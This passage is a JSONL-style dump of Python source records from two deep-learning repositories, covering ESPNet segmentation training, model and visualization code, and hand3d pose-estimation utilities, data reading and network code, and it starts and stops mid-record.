overfitting\n\ntrainLoader = torch.utils.data.DataLoader(\n    myDataLoader.MyDataset(data['trainIm'], data['trainAnnot'], transform=trainDataset_main),\n    batch_size=args.batch_size + 2, shuffle=True, num_workers=args.num_workers, pin_memory=True)\n\ntrainLoader_scale1 = torch.utils.data.DataLoader(\n    myDataLoader.MyDataset(data['trainIm'], data['trainAnnot'], transform=trainDataset_scale1),\n    batch_size=args.batch_size, shuffle=True, num_workers=args.num_workers, pin_memory=True)\n\ntrainLoader_scale2 = torch.utils.data.DataLoader(\n    myDataLoader.MyDataset(data['trainIm'], data['trainAnnot'], transform=trainDataset_scale2),\n    batch_size=args.batch_size, shuffle=True, num_workers=args.num_workers, pin_memory=True)\n\ntrainLoader_scale3 = torch.utils.data.DataLoader(\n    myDataLoader.MyDataset(data['trainIm'], data['trainAnnot'], transform=trainDataset_scale3),\n    batch_size=args.batch_size + 4, shuffle=True, num_workers=args.num_workers, pin_memory=True)\n\ntrainLoader_scale4 = torch.utils.data.DataLoader(\n    myDataLoader.MyDataset(data['trainIm'], data['trainAnnot'], transform=trainDataset_scale4),\n    batch_size=args.batch_size + 4, shuffle=True, num_workers=args.num_workers, pin_memory=True)\n\nvalLoader = torch.utils.data.DataLoader(\n    myDataLoader.MyDataset(data['valIm'], data['valAnnot'], transform=valDataset),\n    batch_size=args.batch_size + 4, shuffle=False, num_workers=args.num_workers, pin_memory=True)\n\nif args.onGPU:\n    cudnn.benchmark = True\n\nstart_epoch = 0\n\nif args.resume:\n    if os.path.isfile(args.resumeLoc):\n        print(\"=> loading checkpoint '{}'\".format(args.resume))\n        checkpoint = torch.load(args.resumeLoc)\n        start_epoch = checkpoint['epoch']\n        #args.lr = checkpoint['lr']\n        model.load_state_dict(checkpoint['state_dict'])\n        print(\"=> loaded checkpoint '{}' (epoch {})\"\n            .format(args.resume, checkpoint['epoch']))\n    else:\n        print(\"=> no checkpoint found at '{}'\".format(args.resume))\n\n\nlogFileLoc = args.savedir + args.logFile\nif os.path.isfile(logFileLoc):\n    logger = open(logFileLoc, 'a')\nelse:\n    logger = open(logFileLoc, 'w')\n    logger.write(\"Parameters: %s\" % (str(total_paramters)))\n    logger.write(\"\\n%s\\t%s\\t%s\\t%s\\t%s\\t\" % ('Epoch', 'Loss(Tr)', 'Loss(val)', 'mIOU (tr)', 'mIOU (val'))\nlogger.flush()\n\noptimizer = torch.optim.Adam(model.parameters(), args.lr, (0.9, 0.999), eps=1e-08, weight_decay=5e-4)\n# we step the loss by 2 after step size is reached\nscheduler = torch.optim.lr_scheduler.StepLR(optimizer, step_size=args.step_loss, gamma=0.5)\n\n\nfor epoch in range(start_epoch, args.max_epochs):\n\n    scheduler.step(epoch)\n    lr = 0\n    for param_group in optimizer.param_groups:\n        lr = param_group['lr']\n    print(\"Learning rate: \" +  str(lr))\n\n    # train for one epoch\n    # We consider 1 epoch with all the training data (at different scales)\n    train(args, trainLoader_scale1, model, criteria, optimizer, epoch)\n    train(args, trainLoader_scale2, model, criteria, optimizer, epoch)\n    train(args, trainLoader_scale4, model, criteria, optimizer, epoch)\n    train(args, trainLoader_scale3, model, criteria, optimizer, epoch)\n    lossTr, overall_acc_tr, per_class_acc_tr, per_class_iu_tr, mIOU_tr = train(args, trainLoader, model, criteria, optimizer, epoch)\n\n    # evaluate on validation set\n    lossVal, overall_acc_val, per_class_acc_val, per_class_iu_val, mIOU_val = val(args, valLoader, model, criteria)\n    \n        \n    save_checkpoint({\n        'epoch': epoch + 1,\n        'arch': str(model),\n        'state_dict': model.state_dict(),\n        'optimizer': optimizer.state_dict(),\n        'lossTr': lossTr,\n        'lossVal': lossVal,\n        'iouTr': mIOU_tr,\n        'iouVal': mIOU_val,\n        'lr': lr\n    }, args.savedir + 'checkpoint.pth.tar')\n\n    #save the model also\n    model_file_name = args.savedir + '/model_' + str(epoch + 1) + '.pth'\n    torch.save(model.state_dict(), model_file_name)\n\n    \n\n    with open(args.savedir + 'acc_' + str(epoch) + '.txt', 'w') as log:\n        log.write(\"\\nEpoch: %d\\t Overall Acc (Tr): %.4f\\t Overall Acc (Val): %.4f\\t mIOU (Tr): %.4f\\t mIOU (Val): %.4f\" % (epoch, overall_acc_tr, overall_acc_val, mIOU_tr, mIOU_val))\n        log.write('\\n')\n        log.write('Per Class Training Acc: ' + str(per_class_acc_tr))\n        log.write('\\n')\n        log.write('Per Class Validation Acc: ' + str(per_class_acc_val))\n        log.write('\\n')\n        log.write('Per Class Training mIOU: ' + str(per_class_iu_tr))\n        log.write('\\n')\n        log.write('Per Class Validation mIOU: ' + str(per_class_iu_val))\n\n    logger.write(\"\\n%d\\t\\t%.4f\\t\\t%.4f\\t\\t%.4f\\t\\t%.4f\\t\\t%.7f\" % (epoch, lossTr, lossVal, mIOU_tr, mIOU_val, lr))\n    logger.flush()\n    print(\"Epoch : \" + str(epoch) + ' Details')\n    print(\"\\nEpoch No.: %d\\tTrain Loss = %.4f\\tVal Loss = %.4f\\t mIOU(tr) = %.4f\\t mIOU(val) = %.4f\" % (epoch, lossTr, lossVal, mIOU_tr, mIOU_val))\nlogger.close()", "path": "train\\main.py", "repo_name": "sacmehta/ESPNet", "stars": 519, "license": "mit", "language": "python", "size": 32664}
{"docstring": "'''\n:param nIn: number of input channels\n:param nOut: number of output channels\n:param kSize: kernel size\n:param stride: optional stride rate for down-sampling\n:param d: optional dilation rate\n'''\n", "func_signal": "def __init__(self, nIn, nOut, kSize, stride=1, d=1):\n", "code": "super().__init__()\npadding = int((kSize - 1)/2) * d\nself.conv = nn.Conv2d(nIn, nOut, (kSize, kSize), stride=stride, padding=(padding, padding), bias=False, dilation=d)", "path": "test\\Model.py", "repo_name": "sacmehta/ESPNet", "stars": 519, "license": "mit", "language": "python", "size": 32664}
{"docstring": "# gloabl mean and std values\n", "func_signal": "def evaluateModel(args, model, up, image_list):\n", "code": "mean = [72.3923111, 82.90893555, 73.15840149]\nstd = [45.3192215, 46.15289307, 44.91483307]\n\nfor i, imgName in enumerate(image_list):\n    img = cv2.imread(imgName)\n    if args.overlay:\n        img_orig = np.copy(img)\n\n    img = img.astype(np.float32)\n    for j in range(3):\n        img[:, :, j] -= mean[j]\n    for j in range(3):\n        img[:, :, j] /= std[j]\n\n    # resize the image to 1024x512x3\n    img = cv2.resize(img, (1024, 512))\n    if args.overlay:\n        img_orig = cv2.resize(img_orig, (1024, 512))\n\n    img /= 255\n    img = img.transpose((2, 0, 1))\n    img_tensor = torch.from_numpy(img)\n    img_tensor = torch.unsqueeze(img_tensor, 0)  # add a batch dimension\n    img_variable = Variable(img_tensor, volatile=True)\n    if args.gpu:\n        img_variable = img_variable.cuda()\n    img_out = model(img_variable)\n\n    if args.modelType == 2:\n        img_out = up(img_out)\n\n    classMap_numpy = img_out[0].max(0)[1].byte().cpu().data.numpy()\n\n    if i % 100 == 0:\n        print(i)\n\n    name = imgName.split('/')[-1]\n\n    if args.colored:\n        classMap_numpy_color = np.zeros((img.shape[1], img.shape[2], img.shape[0]), dtype=np.uint8)\n        for idx in range(len(pallete)):\n            [r, g, b] = pallete[idx]\n            classMap_numpy_color[classMap_numpy == idx] = [b, g, r]\n        cv2.imwrite(args.savedir + os.sep + 'c_' + name.replace(args.img_extn, 'png'), classMap_numpy_color)\n        if args.overlay:\n            overlayed = cv2.addWeighted(img_orig, 0.5, classMap_numpy_color, 0.5, 0)\n            cv2.imwrite(args.savedir + os.sep + 'over_' + name.replace(args.img_extn, 'jpg'), overlayed)\n\n    if args.cityFormat:\n        classMap_numpy = relabel(classMap_numpy.astype(np.uint8))\n\n    cv2.imwrite(args.savedir + os.sep + name.replace(args.img_extn, 'png'), classMap_numpy)", "path": "test\\VisualizeResults.py", "repo_name": "sacmehta/ESPNet", "stars": 519, "license": "mit", "language": "python", "size": 32664}
{"docstring": "'''\nThis function relabels the predicted labels so that cityscape dataset can process\n:param img:\n:return:\n'''\n", "func_signal": "def relabel(img):\n", "code": "img[img == 19] = 255\nimg[img == 18] = 33\nimg[img == 17] = 32\nimg[img == 16] = 31\nimg[img == 15] = 28\nimg[img == 14] = 27\nimg[img == 13] = 26\nimg[img == 12] = 25\nimg[img == 11] = 24\nimg[img == 10] = 23\nimg[img == 9] = 22\nimg[img == 8] = 21\nimg[img == 7] = 20\nimg[img == 6] = 19\nimg[img == 5] = 17\nimg[img == 4] = 13\nimg[img == 3] = 12\nimg[img == 2] = 11\nimg[img == 1] = 8\nimg[img == 0] = 7\nimg[img == 255] = 0\nreturn img", "path": "test\\VisualizeResults.py", "repo_name": "sacmehta/ESPNet", "stars": 519, "license": "mit", "language": "python", "size": 32664}
{"docstring": "'''\n:param samplingTimes: The rate at which you want to down-sample the image\n'''\n", "func_signal": "def __init__(self, samplingTimes):\n", "code": "super().__init__()\nself.pool = nn.ModuleList()\nfor i in range(0, samplingTimes):\n    #pyramid-based approach for down-sampling\n    self.pool.append(nn.AvgPool2d(3, stride=2, padding=1))", "path": "test\\Model.py", "repo_name": "sacmehta/ESPNet", "stars": 519, "license": "mit", "language": "python", "size": 32664}
{"docstring": "'''\n:param input: input feature map\n:return: transformed feature map\n'''\n# reduce\n", "func_signal": "def forward(self, input):\n", "code": "output1 = self.c1(input)\n# split and transform\nd1 = self.d1(output1)\nd2 = self.d2(output1)\nd4 = self.d4(output1)\nd8 = self.d8(output1)\nd16 = self.d16(output1)\n\n# heirarchical fusion for de-gridding\nadd1 = d2\nadd2 = add1 + d4\nadd3 = add2 + d8\nadd4 = add3 + d16\n\n#merge\ncombine = torch.cat([d1, add1, add2, add3, add4], 1)\n\n# if residual version\nif self.add:\n    combine = input + combine\noutput = self.bn(combine)\nreturn output", "path": "test\\Model.py", "repo_name": "sacmehta/ESPNet", "stars": 519, "license": "mit", "language": "python", "size": 32664}
{"docstring": "'''\n:param args: general arguments\n:param val_loader: loaded for validation dataset\n:param model: model\n:param criterion: loss function\n:return: average epoch loss, overall pixel-wise accuracy, per class accuracy, per class iu, and mIOU\n'''\n#switch to evaluation mode\n", "func_signal": "def val(args, val_loader, model, criterion):\n", "code": "model.eval()\n\niouEvalVal = iouEval(args.classes)\n\nepoch_loss = []\n\ntotal_batches = len(val_loader)\nfor i, (input, target) in enumerate(val_loader):\n    start_time = time.time()\n\n    if args.onGPU == True:\n        input = input.cuda()\n        target = target.cuda()\n\n    input_var = torch.autograd.Variable(input, volatile=True)\n    target_var = torch.autograd.Variable(target, volatile=True)\n\n    # run the mdoel\n    output = model(input_var)\n\n    # compute the loss\n    loss = criterion(output, target_var)\n\n    epoch_loss.append(loss.data[0])\n\n    time_taken = time.time() - start_time\n\n    # compute the confusion matrix\n    iouEvalVal.addBatch(output.max(1)[1].data, target_var.data)\n\n    print('[%d/%d] loss: %.3f time: %.2f' % (i, total_batches, loss.data[0], time_taken))\n\naverage_epoch_loss_val = sum(epoch_loss) / len(epoch_loss)\n\noverall_acc, per_class_acc, per_class_iu, mIOU = iouEvalVal.getMetric()\n\nreturn average_epoch_loss_val, overall_acc, per_class_acc, per_class_iu, mIOU", "path": "train\\main.py", "repo_name": "sacmehta/ESPNet", "stars": 519, "license": "mit", "language": "python", "size": 32664}
{"docstring": "'''\n:param imList: image list (Note that these lists have been processed and pickled using the loadData.py)\n:param labelList: label list (Note that these lists have been processed and pickled using the loadData.py)\n:param transform: Type of transformation. SEe Transforms.py for supported transformations\n'''\n", "func_signal": "def __init__(self, imList, labelList, transform=None):\n", "code": "self.imList = imList\nself.labelList = labelList\nself.transform = transform", "path": "train\\DataSet.py", "repo_name": "sacmehta/ESPNet", "stars": 519, "license": "mit", "language": "python", "size": 32664}
{"docstring": "'''\n:param input: input feature map\n:return: normalized and thresholded feature map\n'''\n", "func_signal": "def forward(self, input):\n", "code": "output = self.bn(input)\noutput = self.act(output)\nreturn output", "path": "test\\Model.py", "repo_name": "sacmehta/ESPNet", "stars": 519, "license": "mit", "language": "python", "size": 32664}
{"docstring": "'''\n\n:param idx: Index of the image file\n:return: returns the image and corresponding label file.\n'''\n", "func_signal": "def __getitem__(self, idx):\n", "code": "image_name = self.imList[idx]\nlabel_name = self.labelList[idx]\nimage = cv2.imread(image_name)\nlabel = cv2.imread(label_name, 0)\nif self.transform:\n    [image, label] = self.transform(image, label)\nreturn (image, label)", "path": "train\\DataSet.py", "repo_name": "sacmehta/ESPNet", "stars": 519, "license": "mit", "language": "python", "size": 32664}
{"docstring": "'''\n:param nIn: number of input channels\n:param nOut: number of output channels\n:param add: if true, add a residual connection through identity operation. You can use projection too as\n        in ResNet paper, but we avoid to use it if the dimensions are not the same because we do not want to\n        increase the module complexity\n'''\n", "func_signal": "def __init__(self, nIn, nOut, add=True):\n", "code": "super().__init__()\nn = int(nOut/5)\nn1 = nOut - 4*n\nself.c1 = C(nIn, n, 1, 1)\nself.d1 = CDilated(n, n1, 3, 1, 1) # dilation rate of 2^0\nself.d2 = CDilated(n, n, 3, 1, 2) # dilation rate of 2^1\nself.d4 = CDilated(n, n, 3, 1, 4) # dilation rate of 2^2\nself.d8 = CDilated(n, n, 3, 1, 8) # dilation rate of 2^3\nself.d16 = CDilated(n, n, 3, 1, 16) # dilation rate of 2^4\nself.bn = BR(nOut)\nself.add = add", "path": "test\\Model.py", "repo_name": "sacmehta/ESPNet", "stars": 519, "license": "mit", "language": "python", "size": 32664}
{"docstring": "'''\n:param classes: number of classes in the dataset. Default is 20 for the cityscapes\n:param p: depth multiplier\n:param q: depth multiplier\n'''\n", "func_signal": "def __init__(self, classes=20, p=5, q=3):\n", "code": "super().__init__()\nself.level1 = CBR(3, 16, 3, 2)\nself.sample1 = InputProjectionA(1)\nself.sample2 = InputProjectionA(2)\n\nself.b1 = BR(16 + 3)\nself.level2_0 = DownSamplerB(16 +3, 64)\n\nself.level2 = nn.ModuleList()\nfor i in range(0, p):\n    self.level2.append(DilatedParllelResidualBlockB(64 , 64))\nself.b2 = BR(128 + 3)\n\nself.level3_0 = DownSamplerB(128 + 3, 128)\nself.level3 = nn.ModuleList()\nfor i in range(0, q):\n    self.level3.append(DilatedParllelResidualBlockB(128 , 128))\nself.b3 = BR(256)\n\nself.classifier = C(256, classes, 1, 1)", "path": "test\\Model.py", "repo_name": "sacmehta/ESPNet", "stars": 519, "license": "mit", "language": "python", "size": 32664}
{"docstring": "'''\n:param nIn: number of input channels\n:param nOut: number of output channels\n:param kSize: kernel size\n:param stride: optinal stide for down-sampling\n'''\n", "func_signal": "def __init__(self, nIn, nOut, kSize, stride=1):\n", "code": "super().__init__()\npadding = int((kSize - 1)/2)\nself.conv = nn.Conv2d(nIn, nOut, (kSize, kSize), stride=stride, padding=(padding, padding), bias=False)\nself.bn = nn.BatchNorm2d(nOut, eps=1e-03)", "path": "test\\Model.py", "repo_name": "sacmehta/ESPNet", "stars": 519, "license": "mit", "language": "python", "size": 32664}
{"docstring": "'''\n:param input: input feature map\n:return: transformed feature map\n'''\n", "func_signal": "def forward(self, input):\n", "code": "output = self.conv(input)\nreturn output", "path": "test\\Model.py", "repo_name": "sacmehta/ESPNet", "stars": 519, "license": "mit", "language": "python", "size": 32664}
{"docstring": "'''\n\n:param nIn: number of input channels\n:param nOut: number of output channels\n:param kSize: kernel size\n:param stride: optional stride rate for down-sampling\n'''\n", "func_signal": "def __init__(self, nIn, nOut, kSize, stride=1):\n", "code": "super().__init__()\npadding = int((kSize - 1)/2)\nself.conv = nn.Conv2d(nIn, nOut, (kSize, kSize), stride=stride, padding=(padding, padding), bias=False)", "path": "test\\Model.py", "repo_name": "sacmehta/ESPNet", "stars": 519, "license": "mit", "language": "python", "size": 32664}
{"docstring": "'''\n:param input: input feature map\n:return: transformed feature map\n'''\n", "func_signal": "def forward(self, input):\n", "code": "output = self.conv(input)\n#output = self.conv1(output)\noutput = self.bn(output)\noutput = self.act(output)\nreturn output", "path": "test\\Model.py", "repo_name": "sacmehta/ESPNet", "stars": 519, "license": "mit", "language": "python", "size": 32664}
{"docstring": "\"\"\" Returns a 3D rotation matrix in homogeneous coords.  \"\"\"\n", "func_signal": "def _get_rot_mat_x_hom(angle):\n", "code": "one_vec = tf.ones_like(angle)\nzero_vec = one_vec*0.0\ntrafo_matrix = _stitch_mat_from_vecs([one_vec, zero_vec, zero_vec, zero_vec,\n                                      zero_vec, tf.cos(angle), -tf.sin(angle), zero_vec,\n                                      zero_vec, tf.sin(angle), tf.cos(angle), zero_vec,\n                                      zero_vec, zero_vec, zero_vec, one_vec])\nreturn trafo_matrix", "path": "utils\\relative_trafo.py", "repo_name": "lmb-freiburg/hand3d", "stars": 776, "license": "gpl-2.0", "language": "python", "size": 246}
{"docstring": "\"\"\" Returns a 3D translation matrix in homogeneous coords. \"\"\"\n", "func_signal": "def _get_trans_mat_hom(trans):\n", "code": "one_vec = tf.ones_like(trans)\nzero_vec = one_vec*0.0\ntrafo_matrix = _stitch_mat_from_vecs([one_vec, zero_vec, zero_vec, zero_vec,\n                                      zero_vec, one_vec, zero_vec, zero_vec,\n                                      zero_vec, zero_vec, one_vec, trans,\n                                      zero_vec, zero_vec, zero_vec, one_vec])\nreturn trafo_matrix", "path": "utils\\relative_trafo.py", "repo_name": "lmb-freiburg/hand3d", "stars": 776, "license": "gpl-2.0", "language": "python", "size": 246}
{"docstring": "\"\"\" Creates a map of size (output_shape[0], output_shape[1]) at (center[0], center[1])\n    with variance sigma for multiple coordinates.\"\"\"\n", "func_signal": "def create_multiple_gaussian_map(coords_uv, output_size, sigma, valid_vec=None):\n", "code": "with tf.name_scope('create_multiple_gaussian_map'):\n    sigma = tf.cast(sigma, tf.float32)\n    assert len(output_size) == 2\n    s = coords_uv.get_shape().as_list()\n    coords_uv = tf.cast(coords_uv, tf.int32)\n    if valid_vec is not None:\n        valid_vec = tf.cast(valid_vec, tf.float32)\n        valid_vec = tf.squeeze(valid_vec)\n        cond_val = tf.greater(valid_vec, 0.5)\n    else:\n        cond_val = tf.ones_like(coords_uv[:, 0], dtype=tf.float32)\n        cond_val = tf.greater(cond_val, 0.5)\n\n    cond_1_in = tf.logical_and(tf.less(coords_uv[:, 0], output_size[0]-1), tf.greater(coords_uv[:, 0], 0))\n    cond_2_in = tf.logical_and(tf.less(coords_uv[:, 1], output_size[1]-1), tf.greater(coords_uv[:, 1], 0))\n    cond_in = tf.logical_and(cond_1_in, cond_2_in)\n    cond = tf.logical_and(cond_val, cond_in)\n\n    coords_uv = tf.cast(coords_uv, tf.float32)\n\n    # create meshgrid\n    x_range = tf.expand_dims(tf.range(output_size[0]), 1)\n    y_range = tf.expand_dims(tf.range(output_size[1]), 0)\n\n    X = tf.cast(tf.tile(x_range, [1, output_size[1]]), tf.float32)\n    Y = tf.cast(tf.tile(y_range, [output_size[0], 1]), tf.float32)\n\n    X.set_shape((output_size[0], output_size[1]))\n    Y.set_shape((output_size[0], output_size[1]))\n\n    X = tf.expand_dims(X, -1)\n    Y = tf.expand_dims(Y, -1)\n\n    X_b = tf.tile(X, [1, 1, s[0]])\n    Y_b = tf.tile(Y, [1, 1, s[0]])\n\n    X_b -= coords_uv[:, 0]\n    Y_b -= coords_uv[:, 1]\n\n    dist = tf.square(X_b) + tf.square(Y_b)\n\n    scoremap = tf.exp(-dist / tf.square(sigma)) * tf.cast(cond, tf.float32)\n\n    return scoremap", "path": "data\\BinaryDbReader.py", "repo_name": "lmb-freiburg/hand3d", "stars": 776, "license": "gpl-2.0", "language": "python", "size": 246}
{"docstring": "\"\"\" Initializes weights from pickled python dictionaries.\n\n    Inputs:\n        session: tf.Session, Tensorflow session object containing the network graph\n        weight_files: list of str, Paths to the pickle files that are used to initialize network weights\n        exclude_var_list: list of str, Weights that should not be loaded\n\"\"\"\n", "func_signal": "def init(self, session, weight_files=None, exclude_var_list=None):\n", "code": "if exclude_var_list is None:\n    exclude_var_list = list()\n\nimport pickle\n# Initialize with weights\nfor file_name in weight_files:\n    assert os.path.exists(file_name), \"File not found.\"\n    with open(file_name, 'rb') as fi:\n        weight_dict = pickle.load(fi)\n        weight_dict = {k: v for k, v in weight_dict.items() if not any([x in k for x in exclude_var_list])}\n        if len(weight_dict) > 0:\n            init_op, init_feed = tf.contrib.framework.assign_from_values(weight_dict)\n            session.run(init_op, init_feed)\n            print('Loaded %d variables from %s' % (len(weight_dict), file_name))", "path": "nets\\PosePriorNetwork.py", "repo_name": "lmb-freiburg/hand3d", "stars": 776, "license": "gpl-2.0", "language": "python", "size": 246}
{"docstring": "\"\"\" Infere 3D coordinates from 2D scoremaps. \"\"\"\n", "func_signal": "def inference(self, scoremap, hand_side, evaluation):\n", "code": "scoremap_pooled = tf.nn.avg_pool(scoremap, ksize=[1, 8, 8, 1], strides=[1, 8, 8, 1], padding='SAME')\n\ncoord3d, R = None, None\nif self.variant == 'direct':\n    coord_xyz_rel_normed = self._inference_pose3d(scoremap_pooled, hand_side, evaluation, train=True)\n    coord3d = coord_xyz_rel_normed\nelif self.variant == 'bottleneck':\n    coord_xyz_rel_normed = self._inference_pose3d(scoremap_pooled, hand_side, evaluation, train=True, bottleneck=True)\n    coord3d = coord_xyz_rel_normed\nelif (self.variant == 'local') or (self.variant == 'local_w_xyz_loss'):\n    coord_xyz_rel_loc = self._inference_pose3d(scoremap_pooled, hand_side, evaluation, train=True)\n    coord3d = coord_xyz_rel_loc\n\n    # assemble to real coords\n    coord_xyz_rel_normed = bone_rel_trafo_inv(coord_xyz_rel_loc)\nelif self.variant == 'proposed':\n    # infer coordinates in the canonical frame\n    coord_can = self._inference_pose3d(scoremap_pooled, hand_side, evaluation, train=True)\n    coord3d = coord_can\n\n    # infer viewpoint\n    rot_mat = self._inference_viewpoint(scoremap_pooled, hand_side, evaluation, train=True)\n    R = rot_mat\n\n    # flip hand according to hand side\n    cond_right = tf.equal(tf.argmax(hand_side, 1), 1)\n    cond_right_all = tf.tile(tf.reshape(cond_right, [-1, 1, 1]), [1, self.num_kp, 3])\n    coord_xyz_can_flip = self._flip_right_hand(coord_can, cond_right_all)\n\n    # rotate view back\n    coord_xyz_rel_normed = tf.matmul(coord_xyz_can_flip, rot_mat)\nelse:\n    assert 0, \"Unknown variant.\"\n\nreturn coord_xyz_rel_normed, coord3d, R", "path": "nets\\PosePriorNetwork.py", "repo_name": "lmb-freiburg/hand3d", "stars": 776, "license": "gpl-2.0", "language": "python", "size": 246}
{"docstring": "\"\"\" My implementation of atan2 in tensorflow.  Returns in -pi .. pi.\"\"\"\n", "func_signal": "def _atan2(y, x):\n", "code": "tan = tf.atan(y / (x + 1e-8))  # this returns in -pi/2 .. pi/2\n\none_map = tf.ones_like(tan)\n\n# correct quadrant error\ncorrection = tf.where(tf.less(x + 1e-8, 0.0), 3.141592653589793*one_map, 0.0*one_map)\ntan_c = tan + correction  # this returns in -pi/2 .. 3pi/2\n\n# bring to positive values\ncorrection = tf.where(tf.less(tan_c, 0.0), 2*3.141592653589793*one_map, 0.0*one_map)\ntan_zero_2pi = tan_c + correction  # this returns in 0 .. 2pi\n\n# make symmetric\ncorrection = tf.where(tf.greater(tan_zero_2pi, 3.141592653589793), -2*3.141592653589793*one_map, 0.0*one_map)\ntan_final = tan_zero_2pi + correction  # this returns in -pi .. pi\nreturn tan_final", "path": "utils\\relative_trafo.py", "repo_name": "lmb-freiburg/hand3d", "stars": 776, "license": "gpl-2.0", "language": "python", "size": 246}
{"docstring": "\"\"\" Provides input data to the graph. \"\"\"\n# calculate size of each record (this lists what is contained in the db and how many bytes are occupied)\n", "func_signal": "def get(self):\n", "code": "record_bytes = 2\n\nencoding_bytes = 4\nkp_xyz_entries = 3 * self.num_kp\nrecord_bytes += encoding_bytes*kp_xyz_entries\n\nencoding_bytes = 4\nkp_uv_entries = 2 * self.num_kp\nrecord_bytes += encoding_bytes*kp_uv_entries\n\ncam_matrix_entries = 9\nrecord_bytes += encoding_bytes*cam_matrix_entries\n\nimage_bytes = self.image_size[0] * self.image_size[1] * 3\nrecord_bytes += image_bytes\n\nhand_parts_bytes = self.image_size[0] * self.image_size[1]\nrecord_bytes += hand_parts_bytes\n\nkp_vis_bytes = self.num_kp\nrecord_bytes += kp_vis_bytes\n\n\"\"\" READ DATA ITEMS\"\"\"\n# Start reader\nreader = tf.FixedLengthRecordReader(header_bytes=0, record_bytes=record_bytes)\n_, value = reader.read(tf.train.string_input_producer([self.path_to_db]))\n\n# decode to floats\nbytes_read = 0\ndata_dict = dict()\nrecord_bytes_float32 = tf.decode_raw(value, tf.float32)\n\n# 1. Read keypoint xyz\nkeypoint_xyz = tf.reshape(tf.slice(record_bytes_float32, [bytes_read//4], [kp_xyz_entries]), [self.num_kp, 3])\nbytes_read += encoding_bytes*kp_xyz_entries\n\n# calculate palm coord\nif not self.use_wrist_coord:\n    palm_coord_l = tf.expand_dims(0.5*(keypoint_xyz[0, :] + keypoint_xyz[12, :]), 0)\n    palm_coord_r = tf.expand_dims(0.5*(keypoint_xyz[21, :] + keypoint_xyz[33, :]), 0)\n    keypoint_xyz = tf.concat([palm_coord_l, keypoint_xyz[1:21, :], palm_coord_r, keypoint_xyz[-20:, :]], 0)\n\ndata_dict['keypoint_xyz'] = keypoint_xyz\n\n# 2. Read keypoint uv\nkeypoint_uv = tf.cast(tf.reshape(tf.slice(record_bytes_float32, [bytes_read//4], [kp_uv_entries]), [self.num_kp, 2]), tf.int32)\nbytes_read += encoding_bytes*kp_uv_entries\n\nkeypoint_uv = tf.cast(keypoint_uv, tf.float32)\n\n# calculate palm coord\nif not self.use_wrist_coord:\n    palm_coord_uv_l = tf.expand_dims(0.5*(keypoint_uv[0, :] + keypoint_uv[12, :]), 0)\n    palm_coord_uv_r = tf.expand_dims(0.5*(keypoint_uv[21, :] + keypoint_uv[33, :]), 0)\n    keypoint_uv = tf.concat([palm_coord_uv_l, keypoint_uv[1:21, :], palm_coord_uv_r, keypoint_uv[-20:, :]], 0)\n\nif self.coord_uv_noise:\n    noise = tf.truncated_normal([42, 2], mean=0.0, stddev=self.coord_uv_noise_sigma)\n    keypoint_uv += noise\n\ndata_dict['keypoint_uv'] = keypoint_uv\n\n# 3. Camera intrinsics\ncam_mat = tf.reshape(tf.slice(record_bytes_float32, [bytes_read//4], [cam_matrix_entries]), [3, 3])\nbytes_read += encoding_bytes*cam_matrix_entries\ndata_dict['cam_mat'] = cam_mat\n\n# decode to uint8\nbytes_read += 2\nrecord_bytes_uint8 = tf.decode_raw(value, tf.uint8)\n\n# 4. Read image\nimage = tf.reshape(tf.slice(record_bytes_uint8, [bytes_read], [image_bytes]),\n                       [self.image_size[0], self.image_size[1], 3])\nimage = tf.cast(image, tf.float32)\nbytes_read += image_bytes\n\n# subtract mean\nimage = image / 255.0 - 0.5\nif self.hue_aug:\n    image = tf.image.random_hue(image, self.hue_aug_max)\ndata_dict['image'] = image\n\n# 5. Read mask\nhand_parts_mask = tf.reshape(tf.slice(record_bytes_uint8, [bytes_read], [hand_parts_bytes]),\n                       [self.image_size[0], self.image_size[1]])\nhand_parts_mask = tf.cast(hand_parts_mask, tf.int32)\nbytes_read += hand_parts_bytes\ndata_dict['hand_parts'] = hand_parts_mask\nhand_mask = tf.greater(hand_parts_mask, 1)\nbg_mask = tf.logical_not(hand_mask)\ndata_dict['hand_mask'] = tf.cast(tf.stack([bg_mask, hand_mask], 2), tf.int32)\n\n# 6. Read visibilty\nkeypoint_vis = tf.reshape(tf.slice(record_bytes_uint8, [bytes_read], [kp_vis_bytes]),\n                       [self.num_kp])\nkeypoint_vis = tf.cast(keypoint_vis, tf.bool)\nbytes_read += kp_vis_bytes\n\n# calculate palm visibility\nif not self.use_wrist_coord:\n    palm_vis_l = tf.expand_dims(tf.logical_or(keypoint_vis[0], keypoint_vis[12]), 0)\n    palm_vis_r = tf.expand_dims(tf.logical_or(keypoint_vis[21], keypoint_vis[33]), 0)\n    keypoint_vis = tf.concat([palm_vis_l, keypoint_vis[1:21], palm_vis_r, keypoint_vis[-20:]], 0)\ndata_dict['keypoint_vis'] = keypoint_vis\n\nassert bytes_read == record_bytes, \"Doesnt add up.\"\n\n\"\"\" DEPENDENT DATA ITEMS: SUBSET of 21 keypoints\"\"\"\n# figure out dominant hand by analysis of the segmentation mask\none_map, zero_map = tf.ones_like(hand_parts_mask), tf.zeros_like(hand_parts_mask)\ncond_l = tf.logical_and(tf.greater(hand_parts_mask, one_map), tf.less(hand_parts_mask, one_map*18))\ncond_r = tf.greater(hand_parts_mask, one_map*17)\nhand_map_l = tf.where(cond_l, one_map, zero_map)\nhand_map_r = tf.where(cond_r, one_map, zero_map)\nnum_px_left_hand = tf.reduce_sum(hand_map_l)\nnum_px_right_hand = tf.reduce_sum(hand_map_r)\n\n# PRODUCE the 21 subset using the segmentation masks\n# We only deal with the more prominent hand for each frame and discard the second set of keypoints\nkp_coord_xyz_left = keypoint_xyz[:21, :]\nkp_coord_xyz_right = keypoint_xyz[-21:, :]\n\ncond_left = tf.logical_and(tf.cast(tf.ones_like(kp_coord_xyz_left), tf.bool), tf.greater(num_px_left_hand, num_px_right_hand))\nkp_coord_xyz21 = tf.where(cond_left, kp_coord_xyz_left, kp_coord_xyz_right)\n\nhand_side = tf.where(tf.greater(num_px_left_hand, num_px_right_hand),\n                     tf.constant(0, dtype=tf.int32),\n                     tf.constant(1, dtype=tf.int32))  # left hand = 0; right hand = 1\ndata_dict['hand_side'] = tf.one_hot(hand_side, depth=2, on_value=1.0, off_value=0.0, dtype=tf.float32)\n\ndata_dict['keypoint_xyz21'] = kp_coord_xyz21\n\n# make coords relative to root joint\nkp_coord_xyz_root = kp_coord_xyz21[0, :] # this is the palm coord\nkp_coord_xyz21_rel = kp_coord_xyz21 - kp_coord_xyz_root  # relative coords in metric coords\nindex_root_bone_length = tf.sqrt(tf.reduce_sum(tf.square(kp_coord_xyz21_rel[12, :] - kp_coord_xyz21_rel[11, 